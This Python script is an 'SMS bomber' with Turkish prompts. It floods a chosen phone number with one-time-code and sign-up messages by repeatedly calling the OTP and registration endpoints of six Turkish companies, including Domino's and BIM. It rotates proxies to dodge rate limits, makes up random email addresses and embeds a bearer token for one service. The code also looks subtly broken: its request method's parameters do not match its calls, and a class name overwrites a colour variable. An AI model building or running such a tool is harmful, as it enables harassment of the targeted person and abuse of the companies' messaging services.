#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests,os,sys,time
from random import choice,randint
from string import ascii_lowercase
from concurrent.futures import ThreadPoolExecutor

G='\033[92m';R='\033[91m';B='\033[94m';W='\033[97m';S='\033[0m';X='\033[93m'
adet=0;PR=[];pi=0

def py(l):
    global PR,pi
    try:
        if os.path.isfile(l):
            with open(l) as f: PR=[x.strip() for x in f if x.strip() and not x.startswith('#')]
        else: PR=[x.strip() for x in l.split(',') if x.strip()]
        return len(PR)
    except: return 0

def gp():
    global pi,PR
    if not PR: return {}
    p=PR[pi%len(PR)];pi+=1
    return {"http":p,"https":p}

class S:
    def __init__(s,p,m=None):
        s.p=p;tc=[str(randint(1,9))]+[str(randint(0,9)) for _ in range(8)]
        tc.append(str(((int(tc[0])+int(tc[2])+int(tc[4])+int(tc[6])+int(tc[8]))*7-(int(tc[1])+int(tc[3])+int(tc[5])+int(tc[7])))%10))
        tc.append(str((sum(int(x) for x in tc))%10));s.t=''.join(tc)
        s.m=m or (''.join(choice(ascii_lowercase) for _ in range(22))+'@gmail.com')
    
    def g(s,u,j,h,c):
        global adet
        try:
            r=requests.post(u,json=j,headers=h,proxies=gp(),timeout=5)
            if c(r): adet+=1;print(f'{G}[+]{S}{s.p}',flush=True)
        except: pass
    
    def K(s):s.g('Kahve','https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number',{"countryCode":"90","phoneNumber":s.p},{"User-Agent":"Mozilla/5.0","Content-Type":"application/json"},lambda r:r.json().get("processStatus")=="Success")
    def B(s):s.g('BIM','https://bim.veesk.net/service/v1.0/account/login',{"phone":s.p},{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.bim.com.tr"},lambda r:r.status_code==200)
    def F(s):s.g('File','https://api.filemarket.com.tr/v1/otp/send',{"mobilePhoneNumber":f"90{s.p}"},{"User-Agent":"filemarket/1"},lambda r:r.json().get("responseType")=="SUCCESS")
    def D(s):s.g('Domino','https://frontend.dominos.com.tr/api/customer/sendOtpCode',{"email":s.m,"isSure":False,"mobilePhone":s.p},{"User-Agent":"Dominos/7.1.0","Content-Type":"application/json","Authorization":"Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg"},lambda r:r.json().get("isSuccess")==True)
    def P(s):s.g('Porty','https://panel.porty.tech/api.php',{"job":"start_login","phone":s.p},{"User-Agent":"Porty/1"},lambda r:r.status_code==200)
    def E(s):
        try:
            b='--x\r\n';h={"User-Agent":"Evidea/1","Content-Type":"multipart/form-data; boundary=x"}
            d=b+'content-disposition: form-data; name="first_name"\r\n\r\nT\r\n'+b+'content-disposition: form-data; name="last_name"\r\n\r\nU\r\n'+b+'content-disposition: form-data; name="email"\r\n\r\n'+s.m+'\r\n'+b+'content-disposition: form-data; name="password"\r\n\r\nX1\r\n'+b+'content-disposition: form-data; name="phone"\r\n\r\n0'+s.p+'\r\n'+b+'content-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--x--'
            r=requests.post('https://www.evidea.com/users/register/',headers=h,data=d,proxies=gp(),timeout=5)
            if r.status_code==202: global adet;adet+=1;print(f'{G}[+]{S}Evidea',flush=True)
        except: pass

while 1:
    os.system('cls'if os.name=='nt'else'clear')
    print(G+"""
     ___                                             __
   / (_)___  __  ___  ___________ ___  ______ _____/ /
  / / / __ \\/ / / / |/_/ ___/ __ `/ / / / __ `/ __  / 
 / / / / / / /_/ />  <(__  ) /_/ / /_/ / /_/ / /_/ /  
/_/_/_/ /_/\\__,_/_/|_/____/\\__, /\\__,_/\\__,_/\\__,_/   
                             /_/ v5 - Proxy+Agresif
"""+S)
    print(f'{G}[i]{S} linuxsquadSMS | {B}[+] Proxy Rotate{S}')
    print()
    try:
        m=int(input(f'{W}1- SMS Gonder\n2- Cikis\n\nSecim: {G}'))
        if m==1:
            adet=0
            tel=input(f'{W}Numara (0siz 10 hane): {G}')
            if len(tel)!=10 or not tel.isdigit(): print(f'{R}Hatali!{S}');time.sleep(2);continue
            k=input(f'{W}Adet (enter=sinirsiz): {G}').strip()
            k=int(k)if k else None
            a=input(f'{W}Aralik sn (0=hizli): {G}').strip()
            a=float(a)if a else 0
            pr=input(f'{W}Proxy dosyasi (enter=proxies.txt, 0=proxysiz): {G}').strip()
            if pr!='0': py(pr or 'proxies.txt')
            else: PR=[]
            print(f'\n{B}[!] Basliyor... Hedef: {tel}{S}\n')
            s=S(tel);sv=[s.K,s.B,s.F,s.D,s.P,s.E];bas=time.time()
            while k is None or adet<k:
                with ThreadPoolExecutor(max_workers=6) as ex:
                    for fn in sv:
                        if k is not None and adet>=k: break
                        ex.submit(fn)
                if a and (k is None or adet<k): time.sleep(a)
            print(f'\n{G}[+] Tamam: {adet} SMS | Sure: {time.time()-bas:.1f}s{S}')
            input(f'{W}Enter...{S}')
        elif m==2: print(f'{R}Cikiliyor...{S}');break
    except ValueError: print(f'{R}Hatali!{S}');time.sleep(1)
    except KeyboardInterrupt: print(f'\n{X}Durduruldu: {adet}{S}');input()
